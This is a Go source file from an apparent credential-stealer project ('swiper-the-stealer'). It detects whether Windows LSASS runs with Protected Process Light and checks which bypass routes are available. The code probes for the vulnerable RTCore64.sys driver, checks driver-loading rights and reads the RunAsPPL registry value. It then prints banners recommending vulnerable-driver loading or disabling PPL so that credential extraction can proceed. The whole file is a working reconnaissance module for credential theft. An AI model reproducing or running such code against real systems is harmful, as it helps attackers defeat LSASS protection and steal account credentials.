package lsass

import (
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/pkg/logger"

	"golang.org/x/sys/windows"
)

// PPLDetector detects if LSASS is running as Protected Process Light (PPL)
type PPLDetector struct {
	logger *logger.Logger
}

// NewPPLDetector creates a new PPL detector
func NewPPLDetector(logger *logger.Logger) *PPLDetector {
	return &PPLDetector{
		logger: logger,
	}
}

// IsLSASSProtected - Check if LSASS is running with PPL protection
func (pd *PPLDetector) IsLSASSProtected(pid uint32) (bool, string, error) {
	pd.logger.Info("Checking LSASS PPL protection status...")

	// Try to open LSASS with VM_READ access
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		// Access denied usually means PPL is active
		if err == windows.ERROR_ACCESS_DENIED {
			return true, "PPL-Protected (Access Denied)", nil
		}
		return false, "Unknown", fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Check process protection level using NtQueryInformationProcess
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.MustFindProc("NtQueryInformationProcess")

	// ProcessProtectionInformation = 61
	const ProcessProtectionInformation = 61

	type PS_PROTECTION struct {
		Type   uint8
		Audit  uint8
		Signer uint8
		_      uint8 // padding
	}

	var protection PS_PROTECTION
	var returnLength uint32

	ret, _, _ := ntQueryInformationProcess.Call(
		uintptr(hProcess),
		uintptr(ProcessProtectionInformation),
		uintptr(unsafe.Pointer(&protection)),
		uintptr(unsafe.Sizeof(protection)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		// STATUS_NOT_SUPPORTED (0xC00000BB) means no PPL
		if uint32(ret) == 0xC00000BB {
			return false, "Not Protected", nil
		}
		return false, "Query Failed", fmt.Errorf("NtQueryInformationProcess failed: 0x%X", ret)
	}

	// Check protection type
	if protection.Type != 0 {
		protectionType := pd.getProtectionTypeName(protection.Type)
		signerType := pd.getSignerTypeName(protection.Signer)

		status := fmt.Sprintf("PPL-Protected (Type: %s, Signer: %s)", protectionType, signerType)
		pd.logger.Warnf("⚠ LSASS is PPL-protected!")
		pd.logger.Warnf("  Protection Type: %s", protectionType)
		pd.logger.Warnf("  Signer: %s", signerType)

		return true, status, nil
	}

	pd.logger.Info("✓ LSASS is NOT PPL-protected")
	return false, "Not Protected", nil
}

// getProtectionTypeName - Convert protection type to string
func (pd *PPLDetector) getProtectionTypeName(protType uint8) string {
	switch protType {
	case 0:
		return "None"
	case 1:
		return "ProtectedLight"
	case 2:
		return "Protected"
	default:
		return fmt.Sprintf("Unknown (0x%X)", protType)
	}
}

// getSignerTypeName - Convert signer type to string
func (pd *PPLDetector) getSignerTypeName(signer uint8) string {
	switch signer {
	case 0:
		return "None"
	case 1:
		return "Authenticode"
	case 2:
		return "CodeGen"
	case 3:
		return "Antimalware"
	case 4:
		return "Lsa"
	case 5:
		return "Windows"
	case 6:
		return "WinTcb"
	case 7:
		return "WinSystem"
	case 8:
		return "App"
	default:
		return fmt.Sprintf("Unknown (0x%X)", signer)
	}
}

// CheckBypassMethods - Detect available PPL bypass methods
func (pd *PPLDetector) CheckBypassMethods() []string {
	methods := []string{}

	// Check if RTCore64.sys is available
	if pd.checkDriverAvailable("RTCore64") {
		methods = append(methods, "RTCore64.sys BYOVD")
	}

	// Check if mimidrv.sys would work
	if pd.checkDriverLoadable() {
		methods = append(methods, "Kernel Driver (signed)")
	}

	// Check registry RunAsPPL value
	if pd.checkRegistryPPL() {
		methods = append(methods, "Registry Modification (requires reboot)")
	}

	return methods
}

// checkDriverAvailable - Check if vulnerable driver is available
func (pd *PPLDetector) checkDriverAvailable(driverName string) bool {
	// Try to open driver device
	deviceName := fmt.Sprintf("\\\\.\\%s", driverName)
	deviceNamePtr, _ := syscall.UTF16PtrFromString(deviceName)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createFile := kernel32.MustFindProc("CreateFileW")

	handle, _, _ := createFile.Call(
		uintptr(unsafe.Pointer(deviceNamePtr)),
		uintptr(0x80000000|0x40000000), // GENERIC_READ | GENERIC_WRITE
		0,
		0,
		uintptr(3), // OPEN_EXISTING
		0,
		0,
	)

	if handle != 0 && handle != uintptr(0xFFFFFFFFFFFFFFFF) {
		windows.CloseHandle(windows.Handle(handle))
		return true
	}

	return false
}

// checkDriverLoadable - Check if we can load kernel drivers
func (pd *PPLDetector) checkDriverLoadable() bool {
	// Check SeLoadDriverPrivilege
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	// Check for admin rights (simplified check)
	return windows.GetCurrentProcessToken().IsElevated()
}

// checkRegistryPPL - Check RunAsPPL registry value
func (pd *PPLDetector) checkRegistryPPL() bool {
	// Simplified check - just try to open the key and read the value
	k, err := syscall.UTF16PtrFromString("SYSTEM\\CurrentControlSet\\Control\\Lsa")
	if err != nil {
		return false
	}

	var key syscall.Handle
	err = syscall.RegOpenKeyEx(
		syscall.HKEY_LOCAL_MACHINE,
		k,
		0,
		syscall.KEY_READ,
		&key,
	)
	if err != nil {
		return false
	}
	defer syscall.RegCloseKey(key)

	valueName, err := syscall.UTF16PtrFromString("RunAsPPL")
	if err != nil {
		return false
	}

	var value uint32
	var valueLen uint32 = 4
	var valueType uint32

	err = syscall.RegQueryValueEx(
		key,
		valueName,
		nil,
		&valueType,
		(*byte)(unsafe.Pointer(&value)),
		&valueLen,
	)

	return err == nil && value != 0
}

// ReportBypassStatus - Display PPL bypass information
func (pd *PPLDetector) ReportBypassStatus(isProtected bool, status string) {
	if !isProtected {
		pd.logger.Info("╔══════════════════════════════════════════════════════════════╗")
		pd.logger.Info("║  LSASS Protection: DISABLED                                  ║")
		pd.logger.Info("║  Credential extraction should work with OpenProcess()        ║")
		pd.logger.Info("╚══════════════════════════════════════════════════════════════╝")
		return
	}

	pd.logger.Warn("╔══════════════════════════════════════════════════════════════╗")
	pd.logger.Warn("║  ⚠ LSASS Protection: ENABLED (PPL)                           ║")
	pd.logger.Warn("╠══════════════════════════════════════════════════════════════╣")
	pd.logger.Warn(fmt.Sprintf("║  Status: %-51s ║", status))
	pd.logger.Warn("╠══════════════════════════════════════════════════════════════╣")
	pd.logger.Warn("║  BYPASS METHODS REQUIRED:                                    ║")

	methods := pd.CheckBypassMethods()
	if len(methods) == 0 {
		pd.logger.Warn("║  ❌ No bypass methods available                              ║")
		pd.logger.Warn("║  📋 Options:                                                 ║")
		pd.logger.Warn("║     1. Load vulnerable driver (RTCore64.sys, etc.)          ║")
		pd.logger.Warn("║     2. Use signed kernel driver (requires cert)             ║")
		pd.logger.Warn("║     3. Disable PPL in registry (requires reboot)            ║")
	} else {
		pd.logger.Warn("║  ✓ Available bypass methods:                                 ║")
		for _, method := range methods {
			pd.logger.Warn(fmt.Sprintf("║     • %-54s ║", method))
		}
	}

	pd.logger.Warn("╚══════════════════════════════════════════════════════════════╝")
}
